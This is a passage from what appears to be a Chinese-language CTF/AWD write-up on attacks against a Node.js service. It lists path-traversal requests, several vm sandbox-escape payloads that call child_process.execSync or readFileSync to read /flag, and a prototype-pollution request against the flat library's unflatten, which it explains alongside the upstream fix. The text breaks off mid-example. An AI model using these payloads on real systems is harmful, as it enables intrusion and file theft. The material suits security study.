&#xFF0C;&#x4F46;&#x662F;&#x57FA;&#x672C;&#x8BE5;&#x9898;&#x6240;&#x6709;&#x7684;&#x70B9;&#x90FD;&#x5728;&#x8FD9;&#x4E86;&#x3002;&#x5E76;&#x4E14;&#x6BCF;&#x4E2A;&#x6D41;&#x91CF;&#x5305;&#x90FD;&#x5145;&#x65A5;&#x7740;&#x5927;&#x91CF;&#x7684;&#x5783;&#x573E;&#x6D41;&#x91CF;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x5783;&#x573E;&#x6D41;&#x91CF;&#x5927;&#x8D4F;&#xFF0C;&#x539F;&#x6765;&#x4F60;&#x5C31;&#x662F;&#x4E2D;&#x56FD;&#x6587;&#x5316;&#x5BA3;&#x4F20;&#x5927;&#x4F7F;&#xFF1F;&#x4E0D;&#x7528;&#x6211;&#x591A;&#x8BF4;&#x5C31;&#x77E5;&#x9053;&#x4E86;&#x5427;&#xFF0C;&#x8DDF;&#x67D0;&#x4E2A;&#x5E08;&#x5085;&#x6253;&#x8FC7; AWD &#x7684;&#x90FD;&#x5E94;&#x8BE5;&#x77E5;&#x9053;&#x662F;&#x8C01;&#x53D1;&#x7684;&#x8FD9;&#x4E9B;&#x5783;&#x573E;&#x6D41;&#x91CF;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png" alt></p><h3 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h3><p>&#x4E00;&#x5F00;&#x59CB;&#x5927;&#x591A;&#x961F;&#x4F0D;&#x90FD;&#x6253;&#x7684;&#x662F;<code>require</code>&#x76F4;&#x63A5;&#x5305;&#x542B;&#x7684;&#x70B9;&#xFF0C;&#x7531;&#x4E8E;&#x9898;&#x76EE;&#x5F00;&#x4E86; debug &#x62A5;&#x9519;&#xFF0C;&#x5728;&#x4F7F;&#x7528;<code>require</code>&#x5305;&#x542B; flag &#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x62A5;&#x9519;&#x56DE;&#x663E; flag &#xFF0C;&#x5982;&#x4E0B; 000AAA &#x5373;&#x4E3A; flag</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Invalid or unexpected token<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>/flag:1</span><br><span class="line">000AAAA</span><br><span class="line">^^^</span><br><span class="line"></span><br><span class="line">SyntaxError: Invalid or unexpected token</span><br><span class="line">    at wrapSafe (internal/modules/cjs/loader.js:1070:16)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:1120:27)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1176:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:1000:32)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:899:14)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:1042:19)</span><br><span class="line">    at Module.Hook._require.Module.require (/usr/local/lib/node_modules/pm2/node_modules/require-in-the-middle/index.js:80:39)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:77:18)</span><br><span class="line">    at /service/routes/config.js:21:17</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x601D;&#x8DEF;&#x7684; payload &#x5C31;&#x6709;&#x5F88;&#x591A;&#x53D8;&#x79CD;&#x4E86;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><ul><li><code>POST /config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1</code> &#x52A0;&#x4E0A;&#x4E00;&#x4E9B; body &#x5185;&#x5BB9;&#x3001;&#x6216;&#x8005;&#x8FDB;&#x884C;&#x5168; urlencode &#x3001;&#x53C8;&#x6216;&#x8005;&#x518D;&#x8DEF;&#x5F84;&#x540E;&#x9762;&#x52A0;&#x4E00;&#x4E2A;&#x8DEF;&#x5F84;<code>POST /config/validated/%2Fflag/a HTTP/1.1</code></li><li><code>POST /config/validated/%2ffl%61g HTTP/1.1</code></li><li><code>POST /config/validated/%2fproc%2fself%2froot%2ffl%61g HTTP/1.1</code></li></ul><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5185;&#x7F6E;&#x7684; vm lib &#xFF0C;&#x7531;&#x4E8E; vm lib &#x9003;&#x9038;&#x5DF2;&#x7ECF;&#x88AB;&#x5F04;&#x70C2;&#x4E86;&#xFF0C;&#x57FA;&#x672C;&#x80FD;&#x627E;&#x5230;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x7684; exp &#x76F4;&#x63A5;&#x62FF; flag</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/vm/runInNewContext</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 160</span><br><span class="line"></span><br><span class="line">[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 85</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/&quot;55-/Dqsanp9FGAj8iXHTLNo/PbZBTc&quot;</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 10:52:05 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">{&quot;validator&quot;:&quot;000AAAA\n&quot;,&quot;data&quot;:{&quot;treasure&quot;:&quot;data-piece2&quot;},&quot;msg&quot;:&quot;data is corrupted&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x540E;&#x9762;&#x7684;&#x5C31;&#x662F;&#x57FA;&#x672C;&#x662F;&#x57FA;&#x4E8E; post body &#x7684;&#x53D8;&#x5F62;&#x4E86;&#xFF1A;</p><ul><li><code>[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;const p = this.constructor.constructor(&apos;return this.process&apos;)(); p.mainModule.require(&apos;fs&apos;).readFileSync(&apos;/f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;p = this.constructor.constructor(\&quot;return process\&quot;)(); r = p.mainModule.require; fs = r(\&quot;fs\&quot;); throw new Error(fs.readFileSync(\&quot;/flag\&quot;).toString())&quot;]</code></li><li><code>[&quot;var process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;p = this.constructor.constructor(\&quot;return process\&quot;)(); r = p.mainModule.require; fs = r(\&quot;fs\&quot;); fs.readFileSync(\&quot;/flag\&quot;).toString()&quot;]</code></li><li><code>[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;var process = this.constructor.constructor(\&quot;return process\&quot;)(); p.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;]</code></li><li><code>[&quot;this.constructor.constructor(&apos;return process&apos;)().mainModule.require(&apos;fs&apos;).readFileSync(&apos;/f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;)+[]&quot;]</code></li><li><code>[&quot;this.constructor.constructor(&apos;return process&apos;)().mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f*&apos;)+[]&quot;]</code></li><li><code>[&quot;const process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /*g&apos;).toString()&quot;]</code></li></ul><h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/flat/unflatten</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 29</span><br><span class="line"></span><br><span class="line">{&quot;__proto__.path&quot;: &quot;/flag&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json; charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 35</span><br><span class="line"><span class="hljs-attribute">ETag</span>: W/&quot;23-RVcPh+LK1Ac7n2mAq1KjFd049Xo&quot;</span><br><span class="line"><span class="hljs-attribute">Date</span>: Tue, 13 Oct 2020 16:54:07 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">{&quot;validator&quot;:{},&quot;data&quot;:&quot;000AAAA\n&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x5176;&#x5B9E;&#x662F; 7/18 @po6ix &#x63D0;&#x51FA;&#x4E86; flat lib &#x4E2D;&#x7684; <code>unflatten</code>  &#x5B58;&#x5728;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#xFF1A;<a href="https://github.com/hughsk/flat/issues/105" target="_blank" rel="noopener">https://github.com/hughsk/flat/issues/105</a></p><p>&#x7B80;&#x5355; debug &#x8DDF;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x7B80;&#x5316;&#x4E86;&#x4E00;&#x4E0B;&#x539F;&#x51FD;&#x6570;&#x4EE3;&#x7801;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unflatten</span> (<span class="hljs-params">target, opts</span>) </span>{</span><br><span class="line">  opts = opts || {}</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">const</span> delimiter = opts.delimiter || <span class="hljs-string">&apos;.&apos;</span></span><br><span class="line">  <span class="hljs-keyword">const</span> overwrite = opts.overwrite || <span class="hljs-literal">false</span></span><br><span class="line">  <span class="hljs-keyword">const</span> transformKey = opts.transformKey || keyIdentity</span><br><span class="line">  <span class="hljs-keyword">const</span> result = {}</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">Object</span>.keys(target).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">key</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">const</span> split = key.split(delimiter).map(transformKey)</span><br><span class="line">    <span class="hljs-keyword">let</span> key1 = getkey(split.shift())</span><br><span class="line">    <span class="hljs-keyword">let</span> key2 = getkey(split[<span class="hljs-number">0</span>])</span><br><span class="line">    <span class="hljs-keyword">let</span> recipient = result</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> (key2 !== <span class="hljs-literal">undefined</span>) {</span><br><span class="line">      <span class="hljs-keyword">const</span> type = <span class="hljs-built_in">Object</span>.prototype.toString.call(recipient[key1])</span><br><span class="line">      <span class="hljs-keyword">const</span> isobject = (</span><br><span class="line">        type === <span class="hljs-string">&apos;[object Object]&apos;</span> ||</span><br><span class="line">        type === <span class="hljs-string">&apos;[object Array]&apos;</span></span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">      <span class="hljs-comment">// do not write over falsey, non-undefined values if overwrite is false</span></span><br><span class="line">      <span class="hljs-keyword">if</span> (!overwrite &amp;&amp; !isobject &amp;&amp; <span class="hljs-keyword">typeof</span> recipient[key1] !== <span class="hljs-string">&apos;undefined&apos;</span>) {</span><br><span class="line">        <span class="hljs-keyword">return</span></span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="hljs-keyword">if</span> ((overwrite &amp;&amp; !isobject) || (!overwrite &amp;&amp; recipient[key1] == <span class="hljs-literal">null</span>)) {</span><br><span class="line">        recipient[key1] = (</span><br><span class="line">          <span class="hljs-keyword">typeof</span> key2 === <span class="hljs-string">&apos;number&apos;</span> &amp;&amp;</span><br><span class="line">          !opts.object ? [] : {}</span><br><span class="line">        )</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      recipient = recipient[key1]</span><br><span class="line">      <span class="hljs-keyword">if</span> (split.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">        key1 = getkey(split.shift())</span><br><span class="line">        key2 = getkey(split[<span class="hljs-number">0</span>])</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// unflatten again for &apos;messy objects&apos;</span></span><br><span class="line">    recipient[key1] = unflatten(target[key], opts)</span><br><span class="line">  })</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> result</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x4F20;&#x5165;<code>{&quot;__proto__.path&quot;: &quot;/flag&quot;}</code> &#x5230; <code>target</code> &#x53D8;&#x91CF;&#xFF0C;&#x7136;&#x540E;&#x7ECF;&#x8FC7;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#x4EE5;&#x53CA;&#x64CD;&#x4F5C;&#xFF0C;&#x7ECF;&#x8FC7; <code>while</code> &#x7B2C;&#x4E00;&#x8F6E;&#x5FAA;&#x73AF;&#x5F97;&#x5230;:</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient = recipient[key1]<span class="hljs-comment">//recipient = {}[&quot;__proto__&quot;]</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6; <code>recipient</code> &#x5C31;&#x6307;&#x5411;&#x4E86; <code>Function.prototype</code> &#xFF0C;&#x800C;&#x5FAA;&#x73AF;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#x9012;&#x5F52;&#x6267;&#x884C; <code>unflatten</code> &#x51FD;&#x6570;&#xFF0C;&#x6B64;&#x65F6;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient[key1] = unflatten(target[key], opts) <span class="hljs-comment">// recipient[&apos;path&apos;] = unflatten(&quot;/flag&quot;, {})</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x800C;&#x56E0;&#x4E3A;&#x4F20;&#x5165;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E5F;&#x5C31;&#x662F; <code>/flag</code>  &#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x88AB; <code>unflatten</code> &#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6700;&#x7EC8;&#x7ED3;&#x679C;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">recipient[key1] = <span class="hljs-string">&apos;/flag&apos;</span><span class="hljs-comment">//recipient[&apos;path&apos;] = &apos;/flag&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x53EF;&#x4EE5;&#x7B80;&#x5316;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> obj = {};</span><br><span class="line"><span class="hljs-keyword">var</span> a = {};</span><br><span class="line">obj = obj[<span class="hljs-string">&quot;__proto__&quot;</span>];</span><br><span class="line">obj[<span class="hljs-string">&apos;path&apos;</span>] = <span class="hljs-string">&apos;/flag&apos;</span>;</span><br><span class="line"><span class="hljs-built_in">console</span>.log(obj.path);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(a.path);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x6837;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x7684;&#x6548;&#x679C;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x5C06; <code>config.path</code> &#x6C61;&#x67D3;&#x6210; flag &#x8DEF;&#x5F84;&#x4E86;&#xFF0C;&#x4E5F;&#x5C31;&#x53EF;&#x4EE5;&#x8BFB;&#x5230; flag &#x4E86;</p><p>&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x53D8;&#x5F62;&#x6BD4;&#x5982;&#xFF1A;</p><ul><li>&#x66F4;&#x6539;&#x4F20;&#x8F93;&#x65B9;&#x5F0F;&#x4E3A;<code>application/x-www-form-urlencoded</code></li><li>&#x66F4;&#x6539;&#x5F15;&#x7528;&#x8DEF;&#x5F84;<code>POST /config/validated/..%2fnode_modules%2fflat/unflatten HTTP/1.1</code></li></ul><p>&#x987A;&#x4FBF;&#xFF0C;flat &#x5DF2;&#x7ECF;&#x4FEE;&#x590D;&#x4E86;&#x8FD9;&#x4E2A;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#xFF0C;&#x4FEE;&#x590D;&#x65B9;&#x5F0F;&#x662F;&#x5C06;<code>__proto__</code>&#x8BBE;&#x7F6E;&#x4E3A; <code>key1</code> &#x7684;&#x9ED1;&#x540D;&#x5355;&#xFF1A;<a href="https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8" target="_blank" rel="noopener">https://github.com/hughsk/flat/pull/106/commits/b7815abada29592b0067e391ab215a462a7347e8</a></p><h3 id="Jsonlint"><a href="#Jsonlint" class="headerlink" title="Jsonlint"></a>Jsonlint</h3><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/jsonlint/main</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 33</span><br><span class="line"></span><br><span class="line">{&quot;1&quot;:&quot;../../../../../../../flag&quot;}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 